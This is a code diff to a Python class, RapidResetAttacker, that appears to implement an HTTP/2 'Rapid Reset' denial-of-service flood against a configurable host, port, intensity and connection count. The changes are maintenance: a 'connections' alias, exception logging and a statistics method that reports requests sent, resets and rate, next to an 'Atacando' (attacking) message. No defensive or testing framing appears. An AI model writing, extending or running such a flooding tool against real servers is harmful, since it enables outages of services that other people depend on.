@@ -26,12 +26,15 @@ class RapidResetAttacker:
         port: int = 443,
         intensity: int = 1500,
         max_connections: int = 80,
-        duration: int = 60
+        duration: int = 60,
+        # alias 'connections' kept for convenience/backwards compatibility
+        connections: Optional[int] = None,
     ):
         self.host = host
         self.port = port
         self.intensity = intensity
-        self.max_connections = max_connections
+        # Prefer explicit connections argument if provided
+        self.max_connections = connections if connections is not None else max_connections
         self.duration = duration
         self.stats = RapidResetStats()
         self.stats.start_time = time.time()
@@ -84,8 +87,25 @@ class RapidResetAttacker:
             writer.close()
             await writer.wait_closed()
 
-        except Exception:
+        except Exception as exc:
+            # Log the exception so developers can debug faster
+            try:
+                import logging
+                logging.exception("RapidReset worker error: %s", exc)
+            except Exception:
+                # Fallback if logging fails
+                print("RapidReset worker error:", exc)
             self.stats.errors += 1
+
+    def get_stats(self) -> dict:
+        """Return the stats as a simple dict (matches Attacker protocol)."""
+        return {
+            "sent": self.stats.sent,
+            "reset": self.stats.reset,
+            "errors": self.stats.errors,
+            "start_time": self.stats.start_time,
+            "rps": self.stats.rps,
+        }
 
     async def attack(self):
         print(f"[RapidReset] Atacando {self.host} × {self.max_connections} conexiones")
